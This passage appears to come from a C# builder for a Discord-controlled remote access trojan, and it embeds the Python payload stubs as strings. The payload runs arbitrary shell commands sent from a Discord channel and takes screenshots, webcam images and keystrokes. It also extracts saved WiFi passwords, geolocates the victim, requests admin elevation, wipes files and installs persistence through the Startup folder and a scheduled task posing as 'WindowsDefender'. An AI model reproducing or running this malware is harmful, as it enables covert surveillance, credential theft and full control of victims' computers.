elevate_privileges()\r\n\r\n@bot.command()\r\nasync def cat(ctx, file_name):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            with open(file_name, 'r') as file:\r\n                file_content = file.read()\r\n                await ctx.send(f\"Content of '{file_name}':\\n```\\n{file_content}\\n```\")\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred while reading the file: {e}\")\r\n\r\n@bot.command()\r\nasync def upload(ctx):\r\n    if ctx.channel == created_channel and ctx.message.attachments:\r\n        attachment = ctx.message.attachments[0]\r\n        await attachment.save(attachment.filename)\r\n        await ctx.send(f\"File '{attachment.filename}' uploaded successfully.\")\r\n    elif not ctx.messege.attachments:\r\n        await ctx.send(f\"File did not upload, you did not attach any files...\")\r\n\r\n# Function to generate a Fernet key from a password\r\ndef generate_key_from_password(password, salt=None):\r\n    if salt is None:\r\n        salt = os.urandom(16)\r\n    kdf = PBKDF2HMAC(\r\n        algorithm=hashes.SHA256(),\r\n        iterations=100000,  # You can adjust the number of iterations as needed\r\n        salt=salt,\r\n        length=32  # Length of the derived key\r\n    )\r\n    key = base64.urlsafe_b64encode(kdf.derive(password.encode()))\r\n    return key, salt\r\n\r\n# Function to encrypt a file\r\ndef encrypt_file(input_file, password):\r\n    try:\r\n        key, salt = generate_key_from_password(password)\r\n        fernet = Fernet(key)\r\n        \r\n        with open(input_file, 'rb') as file:\r\n            file_data = file.read()\r\n        \r\n        encrypted_data = fernet.encrypt(file_data)\r\n        \r\n        # Use the same filename for the encrypted file\r\n        with open(input_file, 'wb') as encrypted_file:\r\n            encrypted_file.write(salt + encrypted_data)\r\n        \r\n        return input_file  # Return the updated input file name\r\n    except InvalidToken:\r\n        return \"Invalid token (key or password)\"\r\n\r\n# Function to decrypt a file\r\ndef decrypt_file(input_file, password):\r\n    try:\r\n        with open(input_file, 'rb') as encrypted_file:\r\n            salt = encrypted_file.read(16)  # Read the salt\r\n            encrypted_data = encrypted_file.read()\r\n        \r\n        key, _ = generate_key_from_password(password, salt)  # Reconstruct the key\r\n        \r\n        fernet = Fernet(key)\r\n        decrypted_data = fernet.decrypt(encrypted_data)\r\n        \r\n        # Use the same filename for the decrypted file\r\n        with open(input_file, 'wb') as decrypted_file:\r\n            decrypted_file.write(decrypted_data)\r\n        \r\n        return input_file  # Return the updated input file name\r\n    except InvalidToken:\r\n        return \"Invalid token (key or password)\"\r\n\r\n@bot.command()\r\nasync def encrypt(ctx, input_file, password):\r\n    if ctx.channel == created_channel:\r\n        encrypted_file_name = encrypt_file(input_file, password)\r\n        await ctx.send(f'File encrypted and saved as {encrypted_file_name}')\r\n        return encrypted_file_name\r\n\r\n@bot.command()\r\nasync def decrypt(ctx, input_file, password):\r\n    if ctx.channel == created_channel:\r\n        decrypted_file_name = decrypt_file(input_file, password)\r\n        if decrypted_file_name != \"Invalid token (key or password)\":\r\n            await ctx.send(f'File decrypted and saved as {decrypted_file_name}')\r\n        else:\r\n            await ctx.send(decrypted_file_name)\r\n\r\ndef has_persistence():\r\n    # Check if the bot has persistence using either the .py or .exe method\r\n    script_path = os.path.abspath(__file__)\r\n    startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n    batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n    exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n    \r\n    return os.path.exists(batch_script_path) or os.path.exists(exe_link_path) or script_path.endswith('.exe')\r\n\r\ndef get_system_info():\r\n    try:\r\n        info = []\r\n        info.append(f\"System: {platform.system()}\")\r\n        info.append(f\"Node Name: {platform.node()}\")\r\n        info.append(f\"Release: {platform.release()}\")\r\n        info.append(f\"Version: {platform.version()}\")\r\n        info.append(f\"Machine: {platform.machine()}\")\r\n        info.append(f\"Processor: {platform.processor()}\")\r\n\r\n        # Memory information\r\n        memory = psutil.virtual_memory()\r\n        info.append(f\"Memory Total: {convert_bytes(memory.total)}\")\r\n        info.append(f\"Memory Available: {convert_bytes(memory.available)}\")\r\n        info.append(f\"Memory Used: {convert_bytes(memory.used)} ({memory.percent}%)\")\r\n\r\n        # Disk information\r\n        partitions = psutil.disk_partitions()\r\n        for partition in partitions:\r\n            partition_usage = psutil.disk_usage(partition.mountpoint)\r\n            info.append(f\"Disk {partition.device} ({partition.mountpoint}):\")\r\n            info.append(f\"  Total: {convert_bytes(partition_usage.total)}\")\r\n            info.append(f\"  Used: {convert_bytes(partition_usage.used)} ({partition_usage.percent}%)\")\r\n\r\n        # Additional system information\r\n        info.append(f\"Username: {os.getlogin()}\")\r\n        info.append(f\"Device Name: {platform.node()}\")\r\n        info.append(f\"IsAdmin: {is_admin()}\")\r\n        # Check if the bot has installed persistence (.py or .exe)\r\n        info.append(f\"Has Persistence: {has_persistence()}\")\r\n        private_ip = socket.gethostbyname(socket.gethostname())\r\n        info.append(f\"Private IP: {private_ip}\")\r\n        info.append(f\"Keylogger Activated: {is_logging}\")\r\n\r\n        return '\\n'.join(info)\r\n    except Exception as e:\r\n        return f\"An error occurred while fetching system information: {e}\"\r\n\r\ndef convert_bytes(bytes_value):\r\n    # Convert bytes to human-readable format\r\n    for unit in ['B', 'KB', 'MB', 'GB', 'TB']:\r\n        if bytes_value < 1024:\r\n            return f\"{bytes_value:.2f} {unit}\"\r\n        bytes_value /= 1024\r\n    return f\"{bytes_value:.2f} PB\"\r\n\r\ndef CallME(argument):\r\n    try:\r\n        result = subprocess.run(argument, shell=True, text=True, capture_output=True)\r\n        if result.returncode == 0:\r\n            return result.stdout\r\n        else:\r\n            return f\"Command exited with status code {result.returncode}.\\n{result.stderr}\"\r\n    except Exception as e:\r\n        return f\"An error occurred: {e}\"\r\n\r\nasync def DownloadFile(file_name, channel):\r\n    try:\r\n        with open(file_name, 'rb') as file:\r\n            file_content = file.read()\r\n            file_message = await channel.send(file=discord.File(io.BytesIO(file_content), filename=file_name))\r\n            await channel.send(f\"File '{file_name}' uploaded and available for download.\")\r\n    except Exception as e:\r\n        await channel.send(f\"An error occurred while uploading the file: {e}\")\r\n\r\n# check and ask for elevation\r\n# Function for trying to run the script elevated\r\ndef elevate_privileges():\r\n    try:\r\n        # Re-run the script with elevated privileges\r\n        ctypes.windll.shell32.ShellExecuteW(None, \"runas\", sys.executable, \" \".join(sys.argv), None, 1)\r\n        return \"Success! You should recive a new connection with a Elevated Client.\"\r\n    except Exception as e:\r\n        return f\"Failed to elevate privileges: {e}\"\r\n        sys.exit(1)\r\n\r\n# Function for getting if user is elevated or not\r\ndef is_admin():\r\n    try:\r\n        # Check if the current process has administrative privileges\r\n        return ctypes.windll.shell32.IsUserAnAdmin() != 0\r\n    except:\r\n        return False\r\n\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                    SETTINGS STARTS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\n# The part that runs on start, asking for elevation.\r\nif askForUACOnStart:\r\n    if is_admin():\r\n        print(\"User has administrative privileges already...\")\r\n    else:\r\n        print(\"User does not have administrative privileges. Requesting it now!\")\r\n        elevate_privileges()\r\nelse:\r\n    print(\"Does not try to ask for UAC on start\")\r\n\r\n# Try to install on start or not..\r\nif installOnStart:\r\n    if has_persistence():\r\n        print(\"Client already has persistence, there is no need to install again.\")\r\n    else:\r\n        print(\"Trying to install on start...\")\r\n        try:\r\n            # Check if the operating system is Windows\r\n            if platform.system() == \"Windows\":\r\n                print(\"Operating system is Windows\")\r\n\r\n                script_path = os.path.abspath(__file__)\r\n                startup_folder = os.path.join(os.environ[\"APPDATA\"], \"Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\")\r\n\r\n                try:\r\n                    if running_as_executable:\r\n                        # If the script is an executable\r\n                        executable_path = sys.executable\r\n                        executable_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                        shutil.copy2(executable_path, executable_link_path)\r\n                        print(f\"Executable copied to: {executable_link_path}\")\r\n                    else:\r\n                        # If the script is a .py file\r\n                        if script_path.endswith('.py'):\r\n                            # Create a duplicate copy of the script in C:\\Users\\Public\\PythonScripts\r\n                            public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n                            os.makedirs(public_folder, exist_ok=True)\r\n                            duplicate_script_path = os.path.join(public_folder, \"DiscordBOT_duplicate.py\")\r\n                            shutil.copy2(script_path, duplicate_script_path)\r\n\r\n                            # Create a batch script to run the duplicate .py script\r\n                            batch_script_path = os.path.join(startup_folder, \"DiscordBOT.bat\")\r\n                            batch_script_content = f'@echo off\\n\"{sys.executable}\" \"{duplicate_script_path}\"'\r\n                            with open(batch_script_path, 'w') as batch_file:\r\n                                batch_file.write(batch_script_content)\r\n                            print(f\"Batch script created at: {batch_script_path}\")\r\n                        else:\r\n                            # If the script is an .exe file\r\n                            exe_link_path = os.path.join(startup_folder, \"DiscordBOT.exe\")\r\n                            shutil.copy2(script_path, exe_link_path)\r\n                            print(f\"Executable copied to: {exe_link_path}\")\r\n\r\n                    print(\"Bot installed on startup!\")\r\n                except Exception as copy_error:\r\n                    print(f\"An error occurred while copying the script: {copy_error}\")\r\n            else:\r\n                print(\"This feature is only supported on Windows.\")\r\n        except Exception as os_error:\r\n            print(f\"An error occurred while checking the operating system: {os_error}\")\r\nelse:\r\n    print(\"Does not install on start!\")\r\n\r\n# ------------------------------------------------------------\r\n#\r\n#                     SETTINGS ENDS HERE\r\n#\r\n# ------------------------------------------------------------\r\n\r\nbot.run('" + DBT + "')";
            }
            else if (selectedVersion == "1.8")
            {
                originalStub = "import os\r\nimport platform\r\nimport subprocess\r\nimport io\r\nimport socket\r\nimport sys\r\nimport shutil\r\nimport hashlib\r\nimport base64\r\nimport ctypes\r\nimport asyncio\r\nimport zipfile\r\nimport importlib\r\n\r\n# Check if running as executable\r\nrunning_as_executable = getattr(sys, 'frozen', False)\r\n\r\n\r\n# List of required modules and their corresponding import names\r\nrequired_modules = {\r\n    'psutil': 'psutil',\r\n    'discord': 'discord',\r\n    'pyautogui': 'pyautogui',\r\n    'pillow': 'PIL',\r\n    'opencv-python-headless': 'cv2',\r\n    'pynput': 'pynput',\r\n    'requests': 'requests',\r\n    'psutil': 'psutil',\r\n    'cryptography': 'cryptography',\r\n    'pygetwindow': 'pygetwindow',\r\n    'googlemaps': 'googlemaps',\r\n    'tkinter': 'tkinter',\r\n    'mb': 'mb',\r\n}\r\n\r\n# Additional required module\r\nmissing_modules = []\r\n\r\nfor module, import_name in required_modules.items():\r\n    try:\r\n        # Attempt to import the module\r\n        importlib.import_module(import_name)\r\n    except ImportError:\r\n        # Module is missing, add it to the missing_modules list\r\n        missing_modules.append(module)\r\n\r\n# Check and install required modules if needed\r\nif missing_modules:\r\n    missing_modules_str = \", \".join(missing_modules)\r\n    print(f\"Some required modules are missing: {missing_modules_str}\")\r\n    print(\"Installing missing modules...\")\r\n    try:\r\n        subprocess.check_call([sys.executable, \"-m\", \"pip\", \"install\"] + missing_modules_str.split(', '))\r\n        print(\"Modules installed successfully!\")\r\n    except Exception as e:\r\n        print(\"An error occurred while installing modules:\", e)\r\n        exit(1)\r\nelse:\r\n    print(\"All required modules are already installed.\")\r\n\r\n\r\nimport discord\r\nfrom discord.ext import commands\r\nimport requests\r\nimport pyautogui\r\nfrom cryptography.fernet import Fernet, InvalidToken\r\nfrom pynput import keyboard\r\nfrom cryptography.hazmat.backends import default_backend\r\nfrom cryptography.hazmat.primitives import hashes\r\nfrom cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC\r\nfrom PIL import Image\r\nimport cv2\r\nimport pygetwindow as gw\r\nimport psutil\r\nimport asyncio\r\nimport googlemaps\r\nfrom tkinter import messagebox as mb\r\n\r\n# Settings for build\r\ninstallOnStart = " + cbCTS.Checked + "\r\naskForUACOnStart = " + cbSE.Checked + "\r\ncategorieName = \"" + txtCategorie.Text + "\" \r\nGOOGLE_API_KEY = \"" + txtGoogleAPI.Text + "\"\r\n\r\nintents = discord.Intents.default()\r\nintents.message_content = True\r\n\r\nbot = commands.Bot(command_prefix='!', intents=intents)\r\ncreated_channel = None  # To store the created channel object\r\n\r\nscript_path = os.path.abspath(__file__)\r\n\r\n@bot.event\r\nasync def on_ready():\r\n    print(f'Logged in as {bot.user.name}')\r\n\r\n    # Create encryption key\r\n    key = Fernet.generate_key()\r\n    global cipher_suite\r\n    cipher_suite = Fernet(key)\r\n\r\n\r\n    global created_channel  # Declare the global variable\r\n    system_username = os.getlogin()  # Get the system's username\r\n\r\n    ip_address = requests.get('https://httpbin.org/ip').json()['origin'] # Get public IP address\r\n    print(f'Public IP Address: {ip_address}')\r\n    \r\n    ip_address_with_dashes = ip_address.replace('.', '-')  # Replace periods with dashes\r\n\r\n    # Create the perfect name for chat\r\n    channel_name = f\"{system_username}-{ip_address_with_dashes}\"\r\n    channel_name_lowercase = channel_name.replace('.', '').lower()\r\n    \r\n    guild = bot.guilds[0]  # Assuming the bot is in only one guild\r\n\r\n    category = discord.utils.get(guild.categories, name=categorieName) # Checking category to match the desired one\r\n    print(f'Category Name: {categorieName}')\r\n    \r\n    # Execute the remove_channels function with the created_channel and channel_name\r\n    await remove_channels(guild, channel_name_lowercase)\r\n\r\n    # Create a new text channel with the unique name\r\n    if category is not None:\r\n        created_channel = await guild.create_text_channel(channel_name, category=category)\r\n    else:\r\n        created_channel = await guild.create_text_channel(channel_name)\r\n    print(f'Created Channel Name: {created_channel.name}')\r\n\r\n    # Send a message with the public IP address to the new channel\r\n    await created_channel.send(f\"Public IP Address of the client: **{ip_address}**. Client is **admin = {is_admin()}**. Also, if you want to know more, type **!help**\")\r\n\r\n\r\n@bot.event\r\nasync def on_message(message):\r\n    if message.author == bot.user:\r\n        return\r\n\r\n    # Process !cmd messages\r\n    if message.channel == created_channel and message.content.startswith('!cmd'):\r\n        command_args = message.content.split(' ', 1)\r\n        if len(command_args) == 2:\r\n            output = CallME(command_args[1])\r\n            await message.channel.send(output)  # Send the output back to the chat\r\n\r\n    # Process !download messages\r\n    if message.channel == created_channel and message.content.startswith('!download'):\r\n        file_name = message.content.split(' ', 1)[1]\r\n        await DownloadFile(file_name, message.channel)\r\n\r\n    await bot.process_commands(message)\r\n\r\nasync def remove_channels(guild, ChannelName):\r\n    # Find the category with the specified name\r\n    category = discord.utils.get(guild.categories, name=categorieName)\r\n\r\n    if category is not None:\r\n        # Iterate through text channels within the category\r\n        for channel in category.text_channels:\r\n            if channel.name == ChannelName:\r\n                #await channel.send('!kill2')\r\n                #print(f\"Sent '!kill2' to channel: {channel.name}\")\r\n\r\n                #await asyncio.sleep(5)\r\n                await channel.delete()\r\n                print(f\"Deleted channel: {channel.name}\")\r\n    else:\r\n        print(f\"Category '{categorieName}' not found in this server.\")\r\n\r\n\r\n# Customize the built-in help command\r\nbot.remove_command('help')  # Remove the default help command\r\n\r\n@bot.command(pass_context=True)\r\nasync def help(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!help':\r\n        help_message = (\r\n        \"**Available Commands:**\\n\"\r\n        \"`!cmd <command>` - Execute a shell command.\\n\"\r\n        \"`!download <filename>` - Download a file from the system.\\n\"\r\n        \"`!upload` - Upload a file to the bot.\\n\"\r\n        \"`!version` - Prints out current version.\\n\"\r\n        \"`!restart` - Will disconnect and then hopefully reconnect the bot.\\n\"\r\n        \"`!kill` - Disconnect the bot and remove the chat channel.\\n\"\r\n        \"`!screenshot` - Sends a frame of desktop from client to chat.\\n\"\r\n        \"`!webcam` - Takes a picture using clients webcam and sends it in chat.\\n\"\r\n        \"`!info` - Display some system information, such as GPU, CPU, RAM and more!.\\n\"\r\n        \"`!elevate` - Will try to elevate client from user to admin.\\n\"\r\n        \"`!geolocate` - Calculates position using google maps API.\\n\"\r\n        \"`!install` - Try to get presisence on client system.\\n\"\r\n        \"`!uninstall` - Will remove presisence from client system.\\n\"\r\n        \"`!history` - Gather and download all web history from client.\\n\"\r\n        \"`!volume <volume_procent>` - Changes volume to the given procentage.\\n\"\r\n        \"`!dumplog` - Sends a file containing the keyloggers findings to C2.\\n\"\r\n        \"`!startlog` - Start the keylogging.\\n\"\r\n        \"`!stoplog` - Stop the keylogging.\\n\"\r\n        \"`!encrypt <filename> <password>` - Encrypt a file with a special password.\\n\"\r\n        \"`!decrypt <filename> <password>` - Decrypt a file with the special password.\\n\"\r\n        \"`!sendkey <Hello-World>` - Sends specified keys to client.\\n\"\r\n        \"`!cat <filename>` - Display contents of a file (Must be less then 2000 characters...).\\n\"\r\n        \"`!network` - Retrieve all saved network names their passwords (names with characters like å, ä, ö will not work correctly).\\n\"\r\n        \"`!messagebox <error\\warning\\info> <title> <content>` - Sends a custom made messagebox to client.\"\r\n        )\r\n        await ctx.send(help_message)\r\n    \r\n@bot.command()\r\nasync def kill(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!kill':\r\n        await ctx.send(\"Disconnecting and removing chat channel...\")\r\n        if created_channel:\r\n            await created_channel.delete()\r\n        await bot.close()\r\n        os._exit(0)\r\n\r\n@bot.command()\r\nasync def info(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == '!info':\r\n        system_info = get_system_info()\r\n        await ctx.send(f\"System Information:\\n```\\n{system_info}\\n```\")\r\n\r\n@bot.command()\r\nasync def screenshot(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel and ctx.message.content == '!screenshot':\r\n        try:\r\n            # Capture the screenshot using pyautogui\r\n            screenshot = pyautogui.screenshot()\r\n\r\n            # Save the screenshot to a file\r\n            screenshot_path = 'screenshot.png'\r\n            screenshot.save(screenshot_path)\r\n\r\n            # Upload the screenshot to Discord\r\n            await ctx.send(file=discord.File(screenshot_path))\r\n            \r\n            # Remove the temporary file\r\n            os.remove(screenshot_path)\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def webcam(ctx):\r\n    global created_channel\r\n\r\n    if ctx.channel == created_channel and ctx.message.content == '!webcam':\r\n        try:\r\n            # Initialize the webcam capture\r\n            cap = cv2.VideoCapture(0)  # 0 indicates the default webcam\r\n\r\n            if cap.isOpened():\r\n                # Capture a single frame from the webcam\r\n                ret, frame = cap.read()\r\n\r\n                if ret:\r\n                    # Save the captured image to a file\r\n                    image_path = 'webcam_image.png'\r\n                    cv2.imwrite(image_path, frame)\r\n\r\n                    # Upload the image to Discord\r\n                    await ctx.send(file=discord.File(image_path))\r\n\r\n                    # Remove the temporary image file\r\n                    os.remove(image_path)\r\n\r\n                else:\r\n                    await ctx.send(\"Failed to capture image from webcam.\")\r\n            else:\r\n                await ctx.send(\"Webcam not available.\")\r\n\r\n            # Release the webcam\r\n            cap.release()\r\n\r\n        except Exception as e:\r\n            await ctx.send(f\"An error occurred: {e}\")\r\n\r\n@bot.command()\r\nasync def version(ctx):\r\n    if ctx.channel == created_channel:    \r\n        print(\"Version is 1.8\")\r\n        await ctx.send(\"Current version is 1.8\")\r\n\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                            TEST ZONE STARTS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\n\r\n# Better Persistence\r\n@bot.command()\r\nasync def scheduledtask(ctx):\r\n    # Define the command to create a scheduled task\r\n    scheduled_task_command = 'schtasks /create /tn \"WindowsDefender\" /tr \"python C:\\\\users\\\\public\\\\windef.py\" /sc daily /st 08:00'\r\n\r\n    # Create the scheduled task\r\n    try:\r\n        subprocess.run(scheduled_task_command, shell=True, check=True)\r\n        print(\"Scheduled task created successfully.\")\r\n    except subprocess.CalledProcessError as e:\r\n        print(f\"Error creating scheduled task: {e}\")\r\n\r\n    # Automatically copy the script to C:\\Users\\Public\r\n    try:\r\n        script_path = os.path.abspath(__file__)\r\n        public_folder = os.path.join(os.environ[\"PUBLIC\"], \"PythonScripts\")\r\n        os.makedirs(public_folder, exist_ok=True)\r\n\r\n        if script_path.endswith(('.py', '.pyw')):  # Check if it's a Python script\r\n            duplicate_script_path = os.path.join(public_folder, \"windef.py\")\r\n            shutil.copy2(script_path, duplicate_script_path)\r\n        elif script_path.endswith('.exe'):  # Check if it's an executable\r\n            duplicate_script_path = os.path.join(public_folder, \"windef.exe\")\r\n            shutil.copy2(script_path, duplicate_script_path)\r\n        \r\n        print(f\"Script copied to: {duplicate_script_path}\")\r\n    except Exception as copy_error:\r\n        print(f\"Error copying the script: {copy_error}\")\r\n\r\n    # Define the command to create a scheduled task\r\n    scheduled_task_command = 'schtasks /create /tn \"WindowsDefender\" /tr \"python C:\\\\users\\\\public\\\\windef.py\" /sc daily /st 08:00'\r\n\r\n# ---------------------------------------------------------------------------\r\n#\r\n#                              TEST ZONE ENDS HERE\r\n#\r\n# ---------------------------------------------------------------------------\r\n\r\n@bot.command()\r\nasync def geolocate(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!geolocate\":\r\n        await ctx.send(\"Calculating position...\")\r\n        gmaps = googlemaps.Client(GOOGLE_API_KEY)\r\n        loc = gmaps.geolocate()\r\n        latitude = loc['location']['lat']\r\n        longitude = loc['location']['lng']\r\n        accuracy_radius = loc['accuracy']  # Get the accuracy radius\r\n\r\n        google_maps_link = f\"https://maps.google.com/maps?q={latitude},{longitude}\"\r\n        await ctx.send(f\"Google Maps Link: {google_maps_link}\")\r\n        await ctx.send(f\"Accuracy Radius: {accuracy_radius} meters\")\r\n\r\n@bot.command()\r\nasync def messagebox(ctx, type, title, message):\r\n    if ctx.channel == created_channel:\r\n        try:\r\n            if not type or not title or not message:\r\n                await ctx.send(\"Please make sure you use the following syntax:\\n!messagebox [type] [title] [message]\")\r\n            else:\r\n                if type == \"error\":\r\n                    await ctx.send(\"Messagebox sent **sucessfully**\")\r\n                    mb.showerror(title, message)\r\n                    \r\n                elif type == \"info\":\r\n                    await ctx.send(\"Messagebox sent **sucessfully**\")\r\n                    mb.showinfo(title, message)\r\n                    \r\n                elif type == \"warning\":\r\n                    await ctx.send(\"Messagebox sent **sucessfully**\")\r\n                    mb.showwarning(title, message)\r\n                    \r\n        except Exception as e:\r\n            await ctx.send(f\"An error ocurred when showing messagebox:\\n{e}\")\r\n\r\n# Network stealer\r\n@bot.command()\r\nasync def network(ctx):\r\n    if ctx.channel == created_channel and ctx.message.content == \"!network\":\r\n        await ctx.send(\"Loading WiFi SSIDs and passwords...\")\r\n        nameListString = \"\"\r\n        networkNames = subprocess.check_output(\"netsh wlan show profile\", shell=True, text=True)\r\n        networkNamesLines = networkNames.splitlines()\r\n        for line in networkNamesLines:\r\n            line.strip()\r\n            if ':' in line:\r\n                start = line.index(':') +1\r\n                name = str(line[start:].strip())\r\n                if len(name) > 1:\r\n                    try:\r\n                        checkInfo = f\"netsh wlan show profile name=\\\"{name}\\\" key=clear\"\r\n                        nameInfo = subprocess.check_output(checkInfo, shell=True, text=True)\r\n                        nameInfo = nameInfo.splitlines()\r\n                    except subprocess.CalledProcessError:\r\n                        continue\r\n                    password = \"[!] Not Found!\"\r\n                    for i in nameInfo:\r\n                        if \"Key Content\" in i:\r\n                            start = i.index(\":\") +1\r\n                            password = i[start:].strip()\r\n                    nameListString += \"\\t\\t\" + name + \"\\t:\\t\" + password + \"\\n\"\r\n        await ctx.send(f\"**Saved Networks [NAME : PASSWORD]**:\\n\\n {nameListString}\")\r\n\r\ndef secure_delete_file(path_to_file):\r\n    # Securely delete a file by setting its data to zero.\r\n    CallME('fsutil.exe file setZeroData offset=0 length=9999999999 \"' + path_to_file + '\"')\r\n\r\n@bot.command()\r\nasync def securefile(ctx, path):\r\n    if ctx.channel == created_channel:\r\n        if not path:\r\n            await ctx.send(\"Please provide path to file (!securefile <path-to-file>).\")\r\n            return\r\n        try:\r\n            secure_delete_file(path)\r\n            await ctx.send(\"Successfully fucked file!\")\r\n            os.remove(path)\r\n            await ctx.send(\"File also deleted!\")\r\n            await ctx.message.add_reaction(\"\\U0001F4A5\")  # boom emoji\r\n        except FileNotFoundError as fnfe:\r\n            await ctx.send(\"The specified file was not found (\" + str(fnfe) + \")\")\r\n            return\r\n    \r\n\r\n\r\n\r\n\r\n\r\n@bot.command()\r\nasync def sendkey(ctx, Key):\r\n    if ctx.channel == created_channel:\r\n        if not Key:\r\n            await ctx.send(\"Please provide keys to be pressed (!SendKey <Hello-World\\{ENTER\\}>).\")\r\n            return\r\n\r\n        await ctx.send(\"Creating .VBS script\")\r\n\r\n        # Change all \"-\" to \" \"\r\n        Key = Key.replace(\"-\", \" \")\r\n\r\n        # Create new .vbs script to send key\r\n        script_path = r'C:\\users\\public\\key.vbs'\r\n        with open(script_path, 'w') as f:\r\n            f.write('Set WshShell = WScript.CreateObject(\"WScript.Shell\")\\n')\r\n            f.write(f'WshShell.SendKeys \"{Key}\"\\n')\r\n\r\n        # Execute .vbs script\r\n        await ctx.send(\"Executing Script!\")\r\n        CallME(f'cscript \"{script_path}\"')\r\n\r\n        await ctx.send(\"Sent key: \" + Key)\r\n\r\n\r\n# Create a variable to store the logged keys\r\nlogged_keys = []\r\n\r\n# Define a global variable for the listener and is_logging\r\nlistener = None\r\nis_logging = False\r\n\r\n# Define keys that should trigger a new line\r\nnew_line_keys = set([keyboard.Key.shift_r, keyboard.Key.backspace])\r\n\r\ndef on_key_press(key):\r\n    global is_logging\r\n    if is_logging:\r\n        try:\r\n            # Check if the key is a modifier key and skip logging if it is\r\n            if isinstance(key, keyboard.KeyCode):\r\n                logged_key = key.char\r\n            else:\r\n                logged_key = f\"[{str(key)}]\"\r\n\r\n            if key in new_line_keys:\r\n                logged_keys.append(\"\\n\")  # Start a new line\r\n            logged_keys.append(f\"Key: {logged_key} \")\r\n        except AttributeError:\r\n            if key == keyboard.Key.space:\r\n                logged_key = \" \"\r\n            else:\r\n                logged_key = f\"[{str(key)}]\"\r\n\r\n            if key in new_line_keys:\r\n                logged_keys.append(\"\\n\")  # Start a new line\r\n            logged_keys.append(f\"Key: {logged_key} \")\r\n\r\ndef start_logging():\r\n    global listener, is_logging\r\n    logged_keys.clear()  # Clear previously logged keys\r\n    listener = keyboard.Listener(on_press=on_key_press)\r\n    listener.start()\r\n    is_logging = True\r\n    print(\"Logging started...\")\r\n\r\ndef stop_logging():\r\n    global listener, is_logging\r\n    if listener:\r\n        listener.stop()\r\n        with open(\"keylog.txt\", \"w\") as logfile:\r\n            logfile.write(\" \".join(logged_keys))\r\n        is_logging = False\r\n        print(\"Logging stopped. Keys saved to 'keylog.txt'\")\r\n\r\n@bot.command()\r\nasync def startlog(ctx):\r\n    if ctx.channel == created_channel:\r\n        global is_logging\r\n        if is_logging:\r\n            await ctx.send(\"Logging is already started. Use **!dumplog** to see logs.\")\r\n        else:\r\n            start_logging()\r\n            await ctx.send(\"Logging started. Use **!dumplog** to see logs.\")\r\n\r\n@bot.command()\r\nasync def stoplog(ctx):\r\n    if ctx.channel == created_channel:\r\n        global is_logging\r\n        if is_logging:\r\n            stop_logging()\r\n            await ctx.send(\"Logging stopped. Use **!dumplog** to see logs.\")\r\n        else:\r\n            await ctx.send(\"Logging is already stopped. Use **!dumplog** to see logs.\")\r\n\r\n@bot.command()\r\nasync def dumplog(ctx):\r\n    if ctx.channel == created_channel:\r\n        global logged_keys\r\n        if logged_keys:\r\n            # Save the logged keys to a text file\r\n            with open(\"keylog.txt\", \"w\") as logfile:\r\n                logfile.write(\"\".join(logged_keys))\r\n\r\n            # Send the log file as an attachment\r\n            await ctx.send(\"Here is the log:\", file=discord.File(\"keylog.txt\"))\r\n\r\n            # Delete the temporary log file\r\n            os.remove(\"keylog.txt\")\r\n        else:\r\n            await ctx.send(\"No keys have been logged yet.\")\r\n\r\n@bot.command()\r\nasync def restart(ctx):\r\n    global created_channel\r\n    if ctx.channel == created_channel:\r\n        \r\n        await ctx.send(\"Restarting...\")\r\n\r\n        # Determine the script filename dynamically\r\n        script_filename = sys.argv[0]\r\n\r\n        # Build the command to run the script with arguments\r\n        script_command = [sys.executable, script_filename]\r\n\r\n        # Start a new process to run the script\r\n        subprocess.Popen(script_command)\r\n\r\n        # Delete channel\r\n        if created_channel:\r\n            await created_channel.delete()\r\n\r\n        # Exit the current script\r\n        sys.exit()\r\n\r\n\r\ndef installNirsoft(zip_file_url, exe_file_name):\r\n    # Destination path for the downloaded .zip file\r\n    zip_download_path = r\"C:\\\\Users\\\\Public\\\\archive.zip\"\r\n\r\n    # Directory where you want to extract the .exe file\r\n    extraction_directory = r\"C:\\\\Users\\\\Public\"\r\n    \r\n    # Check if the .zip file already exists, and if not, download it\r\n    if not os.path.exists(zip_download_path):\r\n        try:\r\n            # Download the .zip file\r\n            response = requests.get(zip_file_url)\r\n            with open(zip_download_path, 'wb') as file:\r\n                file.write(response.content)\r\n            print(f\".zip File downloaded to {zip_download_path}\")\r\n        except Exception as e:\r\n            print(f\".zip File download failed: {str(e)}\")\r\n\r\n    # Extract the .exe file from the .zip archive\r\n    try:\r\n        with zipfile.ZipFile(zip_download_path, 'r') as zip_ref:\r\n            # Check if the .exe file exists in the archive\r\n            if exe_file_name in zip_ref.namelist():\r\n                zip_ref.extract(exe_file_name, extraction_directory)\r\n                exe_path = os.path.join(extraction_directory, exe_file_name)\r\n                print(f\".exe File extracted to {exe_path}\")\r\n            else:\r\n                print(f\".exe file '{exe_file_name}' not found in the archive.\")\r\n    except Exception as e:\r\n        print(f\"Extraction of .exe file failed: {str(e)}\")\r\n\r\ndef program_isInstalled(full_path_to_exe):\r\n    return os.path.exists(full_path_to_exe)\r\n\r\n\r\n@bot.command()\r\nasync def history(ctx):\r\n    if ctx.channel == created_channel:\r\n        # URL of the .zip file to download\r\n        zip_file_url = \"https://www.nirsoft.net/utils/browsinghistoryview.zip\"\r\n\r\n        # Destination path for the downloaded .zip file\r\n        zip_download_path = 